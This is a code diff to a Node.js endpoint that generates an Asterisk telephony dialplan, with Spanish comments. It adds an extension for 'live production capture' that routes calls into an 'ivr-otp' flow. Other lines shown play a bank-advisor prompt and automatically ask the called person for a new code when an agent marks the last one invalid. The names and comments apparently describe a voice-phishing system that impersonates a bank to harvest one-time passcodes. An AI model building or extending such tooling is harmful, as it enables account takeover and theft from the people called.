@@ -777,7 +777,13 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
-    dialplanContent += `; 2. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
+    dialplanContent += `; 2a. Extension Dedicada de Captura de Produccion (Extension 7777)\n`;
+    dialplanContent += `exten => 7777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 7777 ===)\n`;
+    dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
+    dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})\n`;
+    dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
+
+    dialplanContent += `; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
     dialplanContent += `exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888: Marcando al cliente o simulando IVR ===)\n`;
     dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
     dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
@@ -956,7 +962,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` ; Si la prueba fue marcada desde el softphone 1002 hacia 8888, transferir al agente en 1001 para verificar el regreso\n`;
     dialplanContent += ` same => n,ExecIf($["\${CALLER_EXT}" = "\${FINAL_AGENT}"]?Set(FINAL_AGENT=1002))\n`;
     dialplanContent += ` same => n,NoOp(=== [IVR] RECONECTANDO LLAMADA CON EL ASESOR EN EXTENSION \${FINAL_AGENT} ===)\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
     dialplanContent += ` ; Rama Inválido: El asesor marcó CÓDIGO INVÁLIDO -> Solicitar nuevo código automáticamente\n`;
@@ -975,7 +981,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" != ""]?Playback(\${IVR_AGENT}):Playback(custom/conectar_asesor_banco))\n`;
     dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
     dialplanContent += ` same => n,NoOp(=== [IVR] MARCANDO EXTENSION DE AGENTE: \${FINAL_AGENT} ===)\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
     dialplanContent += `; Caso: Sin entrada o timeout\n`;
